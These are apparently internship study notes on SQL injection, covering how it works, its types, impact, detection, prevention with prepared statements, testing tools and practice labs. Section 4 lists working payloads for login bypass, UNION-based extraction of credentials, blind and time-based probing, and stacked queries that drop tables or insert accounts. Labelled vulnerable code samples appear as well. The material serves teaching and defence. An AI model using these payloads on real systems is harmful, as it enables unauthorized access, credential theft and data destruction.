# Week 8 — SQL Injection

> **MWR CyberSec Internship** | Cybersecurity Learning Resources  
> *These notes are intended as a reference for anyone learning about SQL Injection as part of a structured cybersecurity programme.*

---

## 📚 Table of Contents

1. [What is SQL Injection?](#1-what-is-sql-injection)
2. [How It Works](#2-how-it-works)
3. [Types of SQL Injection](#3-types-of-sql-injection)
4. [Common Payloads & Examples](#4-common-payloads--examples)
5. [Impact & Risk](#5-impact--risk)
6. [Detection Techniques](#6-detection-techniques)
7. [Prevention & Mitigation](#7-prevention--mitigation)
8. [Tools Used in Practice](#8-tools-used-in-practice)
9. [Hands-On Labs & Practice Platforms](#9-hands-on-labs--practice-platforms)
10. [Key Takeaways](#10-key-takeaways)
11. [References](#11-references)

---

## 1. What is SQL Injection?

**SQL Injection (SQLi)** is one of the oldest, most widespread, and most dangerous web application vulnerabilities. It occurs when an attacker is able to **inject malicious SQL code** into a query that an application sends to its database.

The root cause is almost always the same: **user-supplied input is incorporated into a SQL query without proper validation or sanitisation**. The database cannot distinguish between the legitimate query structure and the attacker's injected code — it executes both.

> 💡 SQL Injection has consistently appeared on the **OWASP Top 10** list of critical web application security risks for over a decade.

---

## 2. How It Works

### Normal Application Flow

```
User Input  -> Application  ->  SQL Query  ->  Database  -> Result
"admin"         SELECT ...       SELECT * FROM users       Returns row
                                 WHERE username = 'admin'
```

### With SQL Injection

```
User Input        ->  Application  ->  SQL Query (Broken)          ->  Database
"admin' OR '1'='1"    SELECT ...       SELECT * FROM users            Returns ALL rows!
                                        WHERE username = 'admin'
                                        OR '1'='1'
```

### Anatomy of a Vulnerable Query (PHP Example)

```php
// VULNERABLE — Never do this
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
```

If a user sends `' OR '1'='1`, the final query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

Since `'1'='1'` is always true, **every row in the database is returned**.

---

## 3. Types of SQL Injection

### 3.1 In-Band SQLi (Most Common)
The attacker uses the **same channel** to both launch the attack and retrieve results.

| Sub-Type | Description |
|---|---|
| **Error-Based** | Forces the database to generate error messages that reveal information about its structure |
| **Union-Based** | Uses the `UNION` operator to append additional SELECT queries and retrieve data from other tables |

### 3.2 Blind SQLi
The application **does not return query results** or errors directly — the attacker infers information from the application's behaviour.

| Sub-Type | Description |
|---|---|
| **Boolean-Based** | Sends true/false queries and observes whether the response changes (e.g., page loads vs. blank page) |
| **Time-Based** | Uses time-delay functions (`SLEEP()`, `WAITFOR DELAY`) to infer true/false conditions based on response time |

### 3.3 Out-of-Band SQLi (Least Common)
Uses **different channels** (DNS, HTTP requests) to exfiltrate data. Relies on database server features being enabled (e.g., `xp_cmdshell` in MSSQL, `UTL_HTTP` in Oracle).

---

## 4. Common Payloads & Examples

> ⚠️ **These are provided for educational purposes only.** Only test against systems you have explicit permission to test.

### Authentication Bypass
```sql
-- Input in username field:
admin' --
' OR 1=1 --
' OR '1'='1
admin'/*
```

### Union-Based Data Extraction
```sql
-- Find number of columns:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error appears = 2 columns exist

-- Extract data:
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### Error-Based (MySQL)
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### Boolean-Based Blind
```sql
-- TRUE condition (page loads normally):
' AND 1=1--

-- FALSE condition (page changes / breaks):
' AND 1=2--

-- Enumerate database name character by character:
' AND SUBSTRING(database(),1,1)='a'--
```

### Time-Based Blind (MySQL)
```sql
-- If vulnerable, page will delay 5 seconds:
' AND SLEEP(5)--

-- Conditional delay:
' AND IF(1=1, SLEEP(5), 0)--
```

### Stacked Queries (where supported)
```sql
'; DROP TABLE users--
'; INSERT INTO users VALUES ('hacker','password')--
```

---

## 5. Impact & Risk

A successful SQL Injection attack can lead to:

| Impact | Description |
|---|---|
| **Authentication Bypass** | Log in as any user, including administrators, without a password |
| **Data Exfiltration** | Steal usernames, passwords (hashed or plain), PII, financial records |
| **Data Manipulation** | Insert, update, or delete database records |
| **Privilege Escalation** | Read OS files or execute OS commands (via `xp_cmdshell`, `LOAD_FILE`, etc.) |
| **Full System Compromise** | In some configurations, gain a shell on the underlying server |
| **Denial of Service** | Drop tables or overload the database |

---

## 6. Detection Techniques

### Manual Testing
- Insert single quote `'` and observe errors
- Insert double quote `"` and observe response
- Submit boolean payloads (`AND 1=1` vs `AND 1=2`) and compare responses
- Use time-based payloads (`SLEEP(5)`) and measure response times
- Check for verbose SQL error messages in responses

### Automated Scanning
- **SQLMap** — the industry-standard automated SQLi tool
- **Burp Suite Scanner** — intercept requests and scan for SQLi
- **OWASP ZAP** — open-source web scanner with SQLi detection

### Error Messages That Reveal SQLi
```
You have an error in your SQL syntax...
Warning: mysql_fetch_array() expects...
ORA-01756: quoted string not properly terminated
Microsoft OLE DB Provider for ODBC Drivers error
```

---

## 7. Prevention & Mitigation

### ✅ Primary Defence: Prepared Statements (Parameterised Queries)

The single most effective defence. The SQL structure is defined first; user input is **never concatenated** into the query.

```python
# Python (using sqlite3 or psycopg2)
# SECURE:
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# VULNERABLE:
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
```

```java
// Java — PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, username);
```

```php
// PHP — PDO with prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

### ✅ Secondary Defence: Stored Procedures
Use stored procedures that are themselves parameterised. Avoid dynamic SQL inside stored procedures.

### ✅ Input Validation & Allowlisting
- Validate input **type**, **length**, **format**, and **range**
- For fields expecting specific formats (e.g., integers, dates), reject anything that doesn't match
- Never rely on input validation alone as the primary defence

### ✅ Escaping User-Supplied Input
A weaker fallback — escape special characters (`'`, `"`, `;`, `--`, etc.) if parameterised queries cannot be used. Use database-specific escaping functions.

### ✅ Least Privilege Principle
- The database account used by the application should have **minimum required permissions**
- A web app account should not have `DROP`, `ALTER`, or `CREATE` privileges
- Separate read and write accounts where possible

### ✅ Web Application Firewall (WAF)
- A WAF can detect and block common SQLi patterns
- **Not a substitute** for secure coding — only a supplementary layer

### ✅ Error Handling
- Never expose raw SQL errors to end users
- Log errors server-side; return generic error messages to the client

### ✅ Regular Security Testing
- Include SQLi testing in your SDLC (Static Analysis, DAST scans, penetration testing)
- Use tools like SQLMap, Burp Suite, OWASP ZAP during testing phases

---

## 8. Tools Used in Practice

| Tool | Type | Use Case |
|---|---|---|
| **SQLMap** | CLI / Automated | Automated SQLi detection and exploitation |
| **Burp Suite** | Proxy / Scanner | Manual & automated web app testing, intercept & modify requests |
| **OWASP ZAP** | Proxy / Scanner | Open-source alternative to Burp for SQLi and other web vulns |
| **Havij** | GUI / Automated | Legacy automated SQLi tool (largely outdated) |
| **jSQL Injection** | GUI / Automated | Java-based SQLi testing tool |
| **Metasploit** | Framework | Post-exploitation after SQLi; also has some SQLi auxiliary modules |
| **Wireshark** | Network Analyser | Observe out-of-band SQLi traffic (DNS, HTTP callbacks) |

---

## 9. Hands-On Labs & Practice Platforms

| Platform | Description | Link |
|---|---|---|
| **PortSwigger Web Security Academy** | Free, structured SQLi labs (beginner → advanced) | https://portswigger.net/web-security/sql-injection |
| **DVWA** | Damn Vulnerable Web Application — local practice environment | https://github.com/digininja/DVWA |
| **HackTheBox** | CTF-style machines including SQLi challenges | https://www.hackthebox.com |
| **TryHackMe** | Guided rooms covering SQLi fundamentals | https://tryhackme.com |
| **WebGoat (OWASP)** | Intentionally insecure web app for learning | https://owasp.org/www-project-webgoat/ |
| **SQLZoo** | Learn SQL syntax (foundational knowledge) | https://sqlzoo.net |

---

## 10. Key Takeaways

- 🔑 **SQL Injection is a trust problem** — applications must never trust user input.
- 🔑 **Parameterised queries / prepared statements** are the gold-standard defence.
- 🔑 There are multiple SQLi types — **in-band, blind, and out-of-band** — each requiring different detection and exploitation techniques.
- 🔑 Even a **single vulnerable input field** can lead to full database compromise.
- 🔑 **Least privilege** limits the blast radius of a successful attack.
- 🔑 Always test for SQLi in **every user-supplied input**: URL parameters, form fields, HTTP headers, cookies, and JSON/XML body parameters.
- 🔑 A WAF helps but is **not a replacement** for writing secure code.

---

## 11. References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Cloudflare — What is SQL Injection?](https://www.cloudflare.com/learning/security/threats/sql-injection/)
- [Microsoft Learn — SQL Injection (Relational Databases)](https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection?view=sql-server-ver17)
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [MWR CyberSec — The Root of All E-Vulns](https://mwrcybersec.com/the-root-of-all-e-vulns)

---

*📁 Part of the MWR CyberSec Internship GitHub resource repository.*  
*Feel free to fork, contribute, or raise issues if you spot anything that needs updating.*
Author: **Karabo Mothapo**
